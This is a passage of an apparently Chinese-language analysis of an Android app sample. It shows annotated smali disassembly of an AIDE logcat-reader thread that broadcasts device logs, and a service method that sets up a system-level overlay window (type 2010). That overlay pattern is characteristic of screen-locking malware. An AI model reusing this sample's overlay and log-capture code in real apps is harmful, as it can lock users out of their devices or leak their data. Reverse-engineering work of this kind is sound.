              .catch Exception {:A2 .. :DC} :1E0
              .catch Exception {:F8 .. :11E} :1E8
              .catch Exception {:1C4 .. :1E0} :1E01
    .end method
ADRTLogCatReader.onContext方法  
调用onContext静态方法，检查本引用是否可以调试，如果不可以则该方法返回为空，如果可以调试，先初始化ADRTSender的一些静态属性，然后开启一个线程，执行`logcat
-v
threadtime`打印日志，然后每次读取20个字符，并且每次读取一行，将其作为数据参数放入intent里，通过广播发送出去，指定接收包名是"com.aide.ui"，action是"com.adrt.LOGCAT_ENTRIES"
    .method public static onContext(Context, String)V
              .registers 12
    00000000  move-object         v0, p0
    00000002  move-object         v1, p1
    00000004  sget-object         v5, ADRTLogCatReader->context:Context  # v5 = ADRTLogCatReader.context
    00000008  if-eqz              v5, :E  # if ADRTLogCatReader.context == null{return null;}这个方法onContext只能调用一次
    :C
    0000000C  return-void
    :E
    0000000E  move-object         v5, v0
    00000010  invoke-virtual      Context->getApplicationContext()Context, v5
    00000016  move-result-object  v5
    00000018  sput-object         v5, ADRTLogCatReader->context:Context  # ADRTLogCatReader.context =  this.getApplicationContext()
    0000001C  const/4             v5, 0
    0000001E  move-object         v6, v0
    00000020  invoke-virtual      Context->getApplicationInfo()ApplicationInfo, v6
    00000026  move-result-object  v6
    00000028  iget                v6, v6, ApplicationInfo->flags:I
    0000002C  const/4             v7, 2
    0000002E  and-int/lit8        v6, v6, 2
    00000032  if-eq               v5, v6, :42  # if(this.ApplicationInfo.flag & 2 == 0){return null;}检查应用是否允许调试
    :36
    00000036  const/4             v5, 1
    :38
    00000038  move                v2, v5
    0000003A  move                v5, v2
    0000003C  if-nez              v5, :46
    :40
    00000040  goto                :C
    :42
    00000042  const/4             v5, 0
    00000044  goto                :38
    :46
    00000046  move-object         v5, v0
    :48
    00000048  invoke-virtual      Context->getPackageManager()PackageManager, v5
    0000004E  move-result-object  v5
    00000050  move-object         v3, v5
    00000052  move-object         v5, v3
    00000054  move-object         v6, v1
    00000056  const/16            v7, 0x0080
    0000005A  invoke-virtual      PackageManager->getPackageInfo(String, I)PackageInfo, v5, v6, v7  # this.getPackageManager().getPackageInfo("com.aide.ui", 0x0080)
    # 这里获取"com.aide.ui"包应用的META信息，但是后面没有再调用了这个的数据
    :60
    00000060  move-result-object  v5
    00000062  move-object         v4, v5
    00000064  sget-object         v5, ADRTLogCatReader->context:Context
    00000068  move-object         v6, v1
    0000006A  invoke-static       ADRTSender->onContext(Context, String)V, v5, v6  # ADRTSender.onContext(ADRTLogCatReader.context, "com.aide.ui")
    00000070  new-instance        v5, Thread  # Thread thread;
    00000074  move-object         v9, v5
    00000076  move-object         v5, v9
    00000078  move-object         v6, v9
    0000007A  new-instance        v7, ADRTLogCatReader  # ADRTLogCatReader aDRTLogCatReader;
    0000007E  move-object         v9, v7
    00000080  move-object         v7, v9
    00000082  move-object         v8, v9
    00000084  invoke-direct       ADRTLogCatReader->()V, v8  # aDRTLogCatReader = new ADRTLogCatReader()
    0000008A  const-string        v8, "LogCat"
    0000008E  invoke-direct       Thread->(Runnable, String)V, v6, v7, v8  # thread(aDRTLogCatReader, "LogCat")
    00000094  move-object         v3, v5
    00000096  move-object         v5, v3
    00000098  invoke-virtual      Thread->start()V, v5  # thread(aDRTLogCatReader, "LogCat").start()
    0000009E  goto                :C
    :A0
    000000A0  move-exception      v5
    000000A2  move-object         v3, v5
    000000A4  goto                :C
              .catch PackageManager$NameNotFoundException {:48 .. :60} :A0
    .end method
    .method public run()V
              .registers 11
    00000000  move-object         v0, p0
    :2
    00000002  invoke-static       Runtime->getRuntime()Runtime
    00000008  move-result-object  v4
    0000000A  const-string        v5, "logcat -v threadtime"
    0000000E  invoke-virtual      Runtime->exec(String)Process, v4, v5  # Process pc = Runtime.getRuntime().exec("logcat -v threadtime")
    00000014  move-result-object  v4
    00000016  move-object         v1, v4
    00000018  new-instance        v4, BufferedReader  # BufferedReader br;
    0000001C  move-object         v9, v4
    0000001E  move-object         v4, v9
    00000020  move-object         v5, v9
    00000022  new-instance        v6, InputStreamReader  # InputStreamReader is;
    00000026  move-object         v9, v6
    00000028  move-object         v6, v9
    0000002A  move-object         v7, v9
    0000002C  move-object         v8, v1
    0000002E  invoke-virtual      Process->getInputStream()InputStream, v8  # pc.getInputStream()
    00000034  move-result-object  v8
    00000036  invoke-direct       InputStreamReader->(InputStream)V, v7, v8  # is = new InputStreamReader(pc.getInputStream)
    0000003C  const/16            v7, 20
    00000040  invoke-direct       BufferedReader->(Reader, I)V, v5, v6, v7  # br = new BufferedReader(new InputStreamReader(pc.getInputStream), 20)
    00000046  move-object         v2, v4
    00000048  const-string        v4, ""
    0000004C  move-object         v3, v4
    :4E
    0000004E  move-object         v4, v2
    00000050  invoke-virtual      BufferedReader->readLine()String, v4  # br.readLine()
    00000056  move-result-object  v4
    00000058  move-object         v9, v4
    0000005A  move-object         v4, v9
    0000005C  move-object         v5, v9
    0000005E  move-object         v3, v5
    00000060  if-eqz              v4, :80
    :64
    00000064  const/4             v4, 1
    00000066  new-array           v4, v4, [String  # String[] st = new String[1];
    0000006A  move-object         v9, v4
    0000006C  move-object         v4, v9
    0000006E  move-object         v5, v9
    00000070  const/4             v6, 0
    00000072  move-object         v7, v3
    00000074  aput-object         v7, v5, v6  # st[0] = br.readLine()
    00000078  invoke-static       ADRTSender->sendLogcatLines([String)V, v4  # ADRTSender.sendLogcatLines(st)
    :7E
    0000007E  goto                :4E
    :80
    00000080  return-void
    :82
    00000082  move-exception      v4
    00000084  move-object         v1, v4
    00000086  goto                :80
              .catch IOException {:2 .. :7E} :82
    .end method
接着分析：onstart方法（android-15之后就被onStartCommand代替了）  
主要执行了方法`c`，主要是将处理好的字符串附加到`layout/newone.xml`文件内的几个TextView控件上
    0000000C  invoke-super        Service->onStart(Intent, I)V, v4, v5, v6  # this.super(v1, v2)
    00000012  move-object         v4, v0
    00000014  invoke-direct       s->c()V, v4  # this.c()
    .method private c()V
              .registers 21
              .annotation system Signature
                  value = {
                      "()V"
                  }
              .end annotation
    00000000  move-object/from16  v1, p0
    00000004  move-object         v15, v1
    00000006  new-instance        v16, WindowManager$LayoutParams
    0000000A  move-object/from16  v19, v16
    0000000E  move-object/from16  v16, v19
    00000012  move-object/from16  v17, v19
    00000016  invoke-direct/range WindowManager$LayoutParams->()V, v17 .. v17
    0000001C  move-object/from16  v0, v16
    00000020  iput-object         v0, v15, s->wmParams:WindowManager$LayoutParams  # this.wmParams = new WindowManager$LayoutParams()
    00000024  move-object         v15, v1
    00000026  move-object/from16  v16, v1
    0000002A  invoke-virtual/range s->getApplication()Application, v16 .. v16
    00000030  move-result-object  v16
    00000032  move-object/from16  v17, v1
    00000036  invoke-virtual/range s->getApplication()Application, v17 .. v17
    0000003C  move-result-object  v17
    0000003E  sget-object         v17, Context->WINDOW_SERVICE:String
    00000042  invoke-virtual/range Application->getSystemService(String)Object, v16 .. v17
    00000048  move-result-object  v16
    0000004A  check-cast          v16, WindowManager
    0000004E  move-object/from16  v0, v16
    00000052  iput-object         v0, v15, s->mWindowManager:WindowManager  # mWindowManager = this.getApplication().getsystemService(CONTEXT.WINDOW_SERVICE)
    00000056  move-object         v15, v1
    00000058  iget-object         v15, v15, s->wmParams:WindowManager$LayoutParams  # this.wmParams
    0000005C  const/16            v16, 2010
    00000060  move/from16         v0, v16
    00000064  iput                v0, v15, WindowManager$LayoutParams->type:I  # this.wmParams.type = 2010
    00000068  move-object         v15, v1
    0000006A  iget-object         v15, v15, s->wmParams:WindowManager$LayoutParams
    0000006E  const/16            v16, 1
    00000072  move/from16         v0, v16
    00000076  iput                v0, v15, WindowManager$LayoutParams->format:I  # this.wmParams.format = 1
    0000007A  move-object         v15, v1
    0000007C  iget-object         v15, v15, s->wmParams:WindowManager$LayoutParams
    00000080  const/16            v16, 0x0500
    00000084  move/from16         v0, v16
    00000088  iput                v0, v15, WindowManager$LayoutParams->flags:I  # this.wmParams.flags = 0x0500
    0000008C  move-object         v15, v1
    0000008E  iget-object         v15, v15, s->wmParams:WindowManager$LayoutParams
    00000092  const/16            v16, 49
    00000096  move/from16         v0, v16
    0000009A  iput                v0, v15, WindowManager$LayoutParams->gravity:I  # this.wmParams.gravity = 49
    0000009E  move-object         v15, v1
    000000A0  iget-object         v15, v15, s->wmParams:WindowManager$LayoutParams
    000000A4  const/16            v16, 0
    000000A8  move/from16         v0, v16
    000000AC  iput                v0, v15, WindowManager$LayoutParams->x:I  # this.wmParams.x = 0
    000000B0  move-object         v15, v1
    000000B2  iget-object         v15, v15, s->wmParams:WindowManager$LayoutParams
    000000B6  const/16            v16, 0
    000000BA  move/from16         v0, v16
    000000BE  iput                v0, v15, WindowManager$LayoutParams->y:I  # this.wmParams.y = 0
    000000C2  move-object         v15, v1